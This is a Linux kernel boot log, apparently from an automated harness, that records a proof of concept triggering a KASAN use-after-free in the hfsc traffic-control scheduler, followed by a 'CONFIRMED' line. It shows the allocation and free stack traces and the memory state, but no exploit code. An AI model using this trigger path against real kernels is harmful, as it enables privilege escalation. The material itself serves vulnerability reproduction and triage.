[    3.291874]  __x64_sys_sendto+0xdb/0x1b0
[    3.292859]  ? exit_to_user_mode_prepare+0x2a/0x110
[    3.293778]  ? syscall_exit_to_user_mode+0x21/0x50
[    3.294785]  do_syscall_64+0x3b/0x90
[    3.295437]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    3.296467] RIP: 0033:0x43c253
[    3.297021] Code: c7 c2 b8 ff ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b8 0f 1f 00 80 3d 31 1e 07 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    3.299812] RSP: 002b:00007ffe5f1c6458 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    3.300636] RAX: ffffffffffffffda RBX: 0000000000000004 RCX: 000000000043c253
[    3.301372] RDX: 0000000000000001 RSI: 0000000000483d44 RDI: 0000000000000004
[    3.302152] RBP: 0000000000020002 R08: 00007ffe5f1c6470 R09: 0000000000000010
[    3.303108] R10: 0000000000000000 R11: 0000000000000202 R12: 00007ffe5f1c6470
[    3.304176] R13: 0000000000868338 R14: 0000000000000001 R15: 0000000000000001
[    3.305478]  </TASK>
[    3.305982] 
[    3.306236] Allocated by task 61:
[    3.306843]  kasan_save_stack+0x33/0x60
[    3.307590]  kasan_set_track+0x25/0x30
[    3.308148]  __kasan_kmalloc+0x8f/0xa0
[    3.308812]  hfsc_change_class+0x54a/0x2e50
[    3.309512]  tc_ctl_tclass+0x3cf/0xf40
[    3.310173]  rtnetlink_rcv_msg+0x35d/0x9d0
[    3.310829]  netlink_rcv_skb+0x12f/0x370
[    3.311418]  netlink_unicast+0x588/0x7f0
[    3.312061]  netlink_sendmsg+0x7b7/0xc60
[    3.312654]  sock_sendmsg+0x13d/0x180
[    3.313206]  ____sys_sendmsg+0x5c5/0x7f0
[    3.313975]  ___sys_sendmsg+0x100/0x180
[    3.314714]  __sys_sendmsg+0xe6/0x190
[    3.315248]  do_syscall_64+0x3b/0x90
[    3.315702]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    3.316464] 
[    3.316734] Freed by task 61:
[    3.317238]  kasan_save_stack+0x33/0x60
[    3.317837]  kasan_set_track+0x25/0x30
[    3.318401]  kasan_save_free_info+0x2b/0x50
[    3.319011]  __kasan_slab_free+0x10a/0x180
[    3.319647]  __kmem_cache_free+0x82/0x1c0
[    3.320271]  hfsc_delete_class+0x44c/0x6f0
[    3.320915]  tc_ctl_tclass+0x9af/0xf40
[    3.321468]  rtnetlink_rcv_msg+0x35d/0x9d0
[    3.322074]  netlink_rcv_skb+0x12f/0x370
[    3.322917]  netlink_unicast+0x588/0x7f0
[    3.324016]  netlink_sendmsg+0x7b7/0xc60
[    3.324894]  sock_sendmsg+0x13d/0x180
[    3.325665]  ____sys_sendmsg+0x5c5/0x7f0
[    3.326339]  ___sys_sendmsg+0x100/0x180
[    3.326900]  __sys_sendmsg+0xe6/0x190
[    3.327397]  do_syscall_64+0x3b/0x90
[    3.328006]  entry_SYSCALL_64_after_hwframe+0x6e/0xd8
[    3.328668] 
[    3.328918] The buggy address belongs to the object at ffff888009fad000
[    3.328918]  which belongs to the cache kmalloc-1k of size 1024
[    3.330730] The buggy address is located 200 bytes inside of
[    3.330730]  freed 1024-byte region [ffff888009fad000, ffff888009fad400)
[    3.333109] 
[    3.333328] The buggy address belongs to the physical page:
[    3.333911] page:00000000f95814f0 refcount:1 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x9fa8
[    3.334869] head:00000000f95814f0 order:3 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    3.335717] flags: 0x100000000010200(slab|head|node=0|zone=1)
[    3.336468] page_type: 0xffffffff()
[    3.337018] raw: 0100000000010200 ffff888006441dc0 dead000000000122 0000000000000000
[    3.338098] raw: 0000000000000000 0000000080100010 00000001ffffffff 0000000000000000
[    3.339222] page dumped because: kasan: bad access detected
[    3.340011] 
[    3.340260] Memory state around the buggy address:
[    3.341091]  ffff888009facf80: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    3.342651]  ffff888009fad000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    3.343740] >ffff888009fad080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    3.344775]                                               ^
[    3.345511]  ffff888009fad100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    3.346586]  ffff888009fad180: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    3.347664] ==================================================================
[    3.349574] Disabling lock debugging due to kernel taint
[    3.350349] drr_dequeue: hfsc qdisc 2: is non-work-conserving?
[*] poc finished without crash; unexpected on the vulnerable kernel
[    5.353581] poc (61) used greatest stack depth: 25680 bytes left
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    6.750553] ACPI: PM: Preparing to enter system sleep state S5
[    6.752941] reboot: Power down
CONFIRMED: KASAN_UAF
